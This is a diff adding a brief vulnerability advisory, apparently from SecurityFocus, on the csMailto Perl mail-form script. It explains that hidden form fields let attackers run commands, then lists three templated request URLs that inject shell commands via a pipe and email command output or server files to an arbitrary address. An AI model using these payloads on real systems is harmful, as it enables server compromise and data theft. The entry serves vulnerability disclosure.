@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/4579/info
+
+CGIScript.NET csMailto is a Perl script designed to support multiple mailto: forms. A vulnerability has been reported in some versions of this script.
+
+Reportedly, configuration values used by the script are contained in hidden form values. As a result, a remote attacker may trivially modify these values between script invocations. Consequences include arbitrary command execution on the vulnerable system.
+
+- execute commands on server
+
+CSMailto.cgi?form-attachment=SHELL_COMMANDS_HERE|&command=mailform
+
+- execute command on server and mail output to anyone
+
+CSMailto.cgi?form-attachment=SHELL_COMMANDS_HERE|&Email=user@host.com&form-autoresponse=YES&command=mailform
+
+- email server file to anyone
+
+CSMailto.cgi?form-attachment=FILEPATH_HERE&Email=user@host.com&form-autoresponse=YES&command=mailform
